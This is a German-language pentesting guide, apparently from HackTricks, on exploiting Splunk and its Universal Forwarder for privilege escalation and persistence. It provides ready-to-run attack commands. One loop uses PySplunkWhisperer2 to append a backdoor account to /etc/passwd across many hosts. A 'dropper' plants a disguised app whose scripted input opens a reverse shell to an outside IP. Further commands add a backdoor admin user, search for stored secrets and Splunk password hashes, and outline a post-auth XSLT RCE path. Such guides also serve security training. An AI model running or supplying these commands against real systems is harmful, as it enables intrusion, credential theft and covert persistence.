# Splunk LPE und Persistence

{{#include ../../banners/hacktricks-training.md}}

Wenn du bei der **internen** oder **externen Enumeration** einer Maschine **Splunk running** vorfindest (normalerweise **8000** für die Web UI und **8089** für die Management API), können gültige Credentials häufig durch die Installation von Apps, scripted inputs oder Management-Aktionen in **code execution** umgewandelt werden. Wenn Splunk als **root** läuft, führt das häufig unmittelbar zu einer **privilege escalation**.

Wenn du nur die allgemeine Remote-Angriffsfläche, Enumeration oder den App-Upload-RCE-Pfad benötigst, siehe:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Wenn du **bereits root** bist und der Splunk-Service nicht ausschließlich auf localhost lauscht, kannst du außerdem **Splunk password hashes** stehlen, **encrypted secrets** wiederherstellen oder eine **malicious app** bereitstellen, um lokal oder über mehrere Forwarder hinweg Persistence aufrechtzuerhalten.

## Interessante lokale Dateien

Wenn du auf einem Host mit Splunk oder Splunk Universal Forwarder landest, sind dies normalerweise die interessantesten Pfade:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Wichtige Artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: lokale Splunk-Benutzer und Passwort-Hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Schlüssel, den Splunk zum Verschlüsseln von Secrets verwendet, die in mehreren `.conf`-Dateien gespeichert sind.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initiale Admin-Bootstrap-Datei; nützlich bei Gold Images und Provisioning-Fehlern. Sie wird ignoriert, wenn `etc/passwd` bereits existiert.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: Ort, an dem scripted inputs üblicherweise aktiviert werden.
- **`$SPLUNK_HOME/etc/deployment-apps/`** oder **`$SPLUNK_HOME/etc/apps/`**: gute Orte, um eine persistente App zu verstecken oder zu überprüfen, was bereits verteilt wird.

## Splunk Universal Forwarder Agent Exploit-Zusammenfassung

Weitere Details finden sich unter [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist lediglich eine Zusammenfassung:

**Exploit-Überblick:**
Ein Exploit gegen den Splunk Universal Forwarder (UF) ermöglicht es Angreifern mit dem **Agent-Passwort**, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, und dadurch potenziell einen großen Teil der Umgebung zu kompromittieren.

**Warum es funktioniert:**

- Der Management-Service des UF ist üblicherweise auf **TCP 8089** erreichbar.
- Angreifer können sich bei der API authentifizieren und den Forwarder anweisen, ein **bösartiges App-Bundle** zu installieren.
- Dieselbe Primitive kann lokal für **LPE** oder remote für **RCE** verwendet werden.
- Öffentlich verfügbare Tools wie **SplunkWhisperer2** erstellen das App-Bundle automatisch und können Payloads für Linux-Ziele anpassen.

**Übliche Möglichkeiten, das Passwort wiederherzustellen:**

- Klartext-Credentials in Dokumentation, Scripts, Shares oder Deployment-Automatisierung.
- Passwort-Hashes in `$SPLUNK_HOME/etc/passwd`, gefolgt von Offline-Cracking.
- Golden Images oder Provisioning-Überbleibsel wie `user-seed.conf`.

**Auswirkungen:**

- Codeausführung auf SYSTEM-/root-Ebene auf jedem kompromittierten Host.
- Bereitstellung persistenter Apps, Backdoors oder Ransomware.
- Deaktivierung oder Manipulation der Telemetrie, bevor die Daten weitergeleitet werden.

**Beispielbefehl für die Ausnutzung:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Nutzbare öffentliche Exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Wenn du **Schreibzugriff auf das Dateisystem** als `root`/`splunk` oder authentifizierten Zugriff zum Installieren von Apps hast, ist das Ablegen einer **custom app** mit einem **scripted input** ein sehr zuverlässiger Persistence-Mechanismus. Splunks eigene Dokumentation erwartet, dass sich scripted inputs innerhalb eines App-Verzeichnisses befinden und über `inputs.conf` aktiviert werden.

Typischer Aufbau:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Schneller Linux-Dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notizen:

- Derselbe Trick funktioniert auch mit **Universal Forwarder** unter `/opt/splunkforwarder/etc/apps/`.
- Angreifer versuchen oft, unauffällig zu bleiben, indem sie ein legitimes Add-on modifizieren, anstatt eine offensichtlich bösartige App zu erstellen.
- Auf einem **deployment server** führt das Platzieren einer bösartigen App in `deployment-apps/` zu **fleet-wide persistence**, da Forwarder regelmäßig aktualisierte Apps abfragen und herunterladen und häufig neu starten, um sie anzuwenden.

## Diebstahl von Zugangsdaten und Übernahme von Admin-Konten

Wenn du Splunks lokale Dateien lesen kannst, gibt es normalerweise zwei lohnende Ziele: **Splunk-Admin-Zugriff** wiederherstellen und **verschlüsselte Service-Zugangsdaten** wiederherstellen.

### Passwort-Hashes und lokale Benutzer

Splunk speichert lokale Authentifizierungsdaten in `etc/passwd`. Je nach Deployment kann das Cracken dieser Datei funktionierende Zugangsdaten für die Web-UI und die Management-API liefern.

Wenn du bereits über gültige **admin**-Zugangsdaten verfügst und Splunk das **native** Authentifizierungs-Backend verwendet, kann die CLI selbst für persistence genutzt werden:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` und verschlüsselte Werte

Splunk verwendet `etc/auth/splunk.secret`, um sensible Werte zu schützen, die in mehreren Konfigurationsdateien gespeichert sind. Wenn du sowohl das **secret** als auch die relevanten **`.conf`-Dateien** stehlen kannst, kannst du häufig Folgendes wiederherstellen oder erneut verwenden:

- gemeinsame Secrets von forwarder/indexer wie `pass4SymmKey`
- Passwörter für TLS private keys wie `sslPassword`
- LDAP-Bind-Credentials wie `bindDNPassword`

Dies ist für **lateral movement** nützlich, selbst wenn das Splunk-Admin-Passwort selbst nicht crackbar ist.

### Abuse von `user-seed.conf`

`user-seed.conf` wird nur beim ersten Start oder wenn `etc/passwd` nicht existiert verwendet. Dadurch ist die Datei auf einem laufenden System weniger nützlich, aber sehr interessant bei:

- kompromittierten Installationstemplates
- Container-Images
- unattended provisioning workflows
- Appliances, auf denen Splunk automatisch reinitialisiert wird

In diesen Fällen verschafft dir das Platzieren eines mit `splunk hash-passwd` generierten `HASHED_PASSWORD` eine unauffällige Möglichkeit, nach einer erneuten Bereitstellung wieder Admin-Zugriff zu erlangen.

## Abuse von Splunk Queries

Weitere Details findest du unter [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Eine nützliche aktuelle Technik besteht darin, **user-supplied XSLT** in verwundbaren Splunk-Enterprise-Versionen zu missbrauchen, um einen authentifizierten Account mit niedrigen Berechtigungen in **OS command execution** als Benutzer `splunk` umzuwandeln.

Ablauf auf hoher Ebene:

1. Authentifiziere dich bei Splunk.
2. Lade eine bösartige **XSL**-Datei über die Preview-/Upload-Funktionalität hoch.
3. Bringe Splunk dazu, Suchergebnisse mit diesem hochgeladenen Stylesheet aus dem **dispatch**-Verzeichnis zu rendern.
4. Verwende den XSLT-Payload, um eine Datei zu schreiben oder über Splunks Search-Pipeline eine Ausführung auszulösen (beispielsweise durch den Zugriff auf interne Funktionalität wie `runshellscript`).

Die wichtigste offensive Erkenntnis ist, dass dieser Weg **post-auth RCE ohne app upload** ermöglicht. Unter Linux erhältst du normalerweise Zugriff auf den Account **`splunk`**, was dennoch wertvoll ist, da dieser Benutzer häufig den Application-Tree besitzt, Secrets lesen und persistente Apps platzieren kann, die auch nach dem Verlust der Shell bestehen bleiben.

Ein repräsentativer Pfad, der während der Exploitation verwendet wird, ist:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Wenn Splunk mit zu vielen Berechtigungen ausgeführt wird oder der Benutzer `splunk` Zugriff auf gefährliche Skripte, beschreibbare Service-Units oder fehlerhafte `sudo`-Regeln hat, entsteht daraus eine saubere **LPE**-Kette.

## Referenzen

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
